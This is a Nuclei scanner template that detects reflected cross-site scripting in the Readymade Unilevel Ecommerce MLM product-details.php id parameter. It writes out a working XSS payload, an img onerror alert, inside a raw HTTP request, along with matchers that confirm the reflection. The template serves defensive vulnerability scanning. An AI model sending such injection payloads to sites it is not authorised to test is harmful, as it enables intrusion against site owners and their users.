id: readymade-unilevel-xss

info:
  name: Readymade Unilevel Ecommerce MLM - Cross-Site Scripting
  author: securityforeveryone
  severity: high
  description: |
    Readymade Unilevel Ecommerce software has xss vulnerability in product-details.php?id
  reference:
    - https://packetstormsecurity.com/files/179886/ReadyMade-Unilevel-Ecommerce-MLM-Blind-SQL-Injection-Cross-Site-Scripting.html
  metadata:
    vendor: i-netsolution
    product: readymade-unilevel-ecommerce
  tags: ecommerce,readymade,xss

variables:
  num1: "{{rand_int(1000, 9999)}}"

http:
  - raw:
      - |
        GET /product-details.php?id=1"><img/src/onerror=.1|alert`{{num1}}`+class={{num1}}> HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "><img/src/onerror=.1|alert`{{num1}}` class={{num1}}>", "user_login_id")'
          - 'contains(content_type, "text/html")'
          - 'status_code == 200'
        condition: and
# digest: 4b0a00483046022100d0e9599c1a8ad2357847cbc0f1294da20e8a961aa0c8754d44782205bd7102780221008b9237772968caa5e10ca79db5013a1283e553f5de8bf75d4418f1278395252b:922c64590222798bb761d5b6d8e72950